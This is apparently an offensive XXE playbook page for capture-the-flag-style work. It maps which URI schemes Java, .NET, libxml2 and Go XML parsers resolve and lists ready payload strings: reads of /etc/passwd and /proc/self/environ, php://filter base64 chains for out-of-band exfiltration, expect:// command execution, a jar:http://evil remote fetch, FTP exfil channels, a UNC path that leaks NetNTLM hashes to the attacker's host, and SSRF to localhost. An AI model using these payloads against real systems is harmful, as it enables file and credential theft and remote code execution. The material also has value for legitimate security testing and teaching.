# Protocol Handlers — what `SYSTEM "…"` can actually fetch

## The matrix — which URI schemes each parser speaks

| Scheme | Java (SAX/DOM) | .NET | libxml2 (PHP/Python/Ruby) | Go xml | Notes |
|---|---|---|---|---|---|
| `file:` | ✓ | ✓ | ✓ | ✓ | the workhorse |
| `http(s):` | ✓ | ✓ | ✓ | ✓ | SSRF + OOB |
| `ftp:` | ✓ | ✓ | ✓ | — | legacy handler |
| `data:` | — | — | ✓ | — | libxml2 only |
| `php://` | — | — | PHP | — | PHP streams |
| `phar://` | — | — | PHP | — | triggers deser |
| `expect://` | — | — | PHP | — | direct exec! |
| `jar:` | ✓ | — | — | — | Java zip-URL |
| `netdoc:` | ✓ | — | — | — | Java ≈ file: |
| `jar:file:` | ✓ | — | — | — | read inside jar |
| `gopher:` | old-JDK | — | via curl | — | unreliable |
| `dict:` | — | — | via curl | — | rare |
| `sftp:`/`scp:` | — | — | curl-builds | — | rare |
| `smb:`/`file:\\` | — | Windows | — | — | UNC/SMB |
| `mailto:`/`news:` | — | — | — | — | not resolvers |

## `file:` — the workhorse

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///c:/users/*/desktop/flag.txt
file:/etc/passwd              — single-slash sometimes works
/etc/passwd                   — bare path — some parsers treat as file
file:///proc/self/environ
file:///proc/1/environ
file:///dev/stdin
```

Java's `file:` also lists directories: `file:///etc/` returns the
directory listing — the enumeration oracle.

## `php://` — PHP's stream family — the exfil amplifier

```
php://filter/convert.base64-encode/resource=/flag
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://filter/zlib.deflate/convert.base64-encode/resource=/flag
php://input
php://output
php://fd/3
```

`php://filter` wraps ANY stream — `convert.base64-encode` solves the
"file contains `<`/`&`" problem AND makes content URL-safe for OOB.
Multiple filters chain: `zlib.deflate/convert.base64-encode` shrinks
the exfil URL.

## `expect://` — direct command execution (PHP)

```
expect://id
expect://cat%20/flag
```

The `expect` PECL wrapper runs the string as a command — XXE → RCE
directly, no file needed. Requires the `expect` extension — rare but
devastating. `xxe-to-rce.md`.

## `jar:`/`netdoc:` — Java extras

```
jar:file:///tmp/x.jar!/internal/path      — read inside a jar
jar:http://x/x.jar!/file                  — remote jar member
netdoc:///etc/passwd                      — netdoc ≈ file
netdoc://host/path
jar:http://evil/x.jar!/x                  — remote jar member read
```

`jar:` lets the parser fetch+unpack a remote jar member — useful as an
alternate channel when plain `file:` is filtered.

## `ftp://` — the legacy channel

`ftp://host/file` — Java/libxml2 support FTP URIs — alternate exfil
channel when HTTP egress filtered. Needs an FTP listener —
`python3 -m pyftpdlib` if installed, else raw socket listener.

## `data:` — libxml2 only

```
data:text/plain;base64,...
data:,text
```

libxml2 (PHP/Python/Ruby via libxml2) supports `data:` URIs — embed a
DTD inline (`data:text/plain,<dtd-content>`) — no external host needed
for the DTD — `external-dtd.md`'s data-URI variant.

## `smb`/UNC — Windows NTLM-leak

`file://\\YOU\share\x` — Windows UNC path — forces SMB auth to your
host — NetNTLM capture (credential leak). Or `file://\\127.0.0.1\c$\...`.

## The "no handler" protocols — what DOESN'T work

- `gopher:` — Java dropped it in JDK8+; libxml2 doesn't speak it
  natively (curl-backed builds do)
- `dict:`/`ldap:`/`tftp:` — parser-dependent, low hit rate
- `ssh:`/`telnet:` — not resolvers
- `javascript:` — XML parsers don't execute JS

## The "local file via HTTP-on-localhost" trick

When `file:` is blocked but `http:` isn't — `http://127.0.0.1/flag` if
the box serves its own files, or `http://127.0.0.1:<port>` enumerating
local services — `ssrf-via-xxe.md`.

## Output to record

- which scheme resolved + which parser + the verbatim result
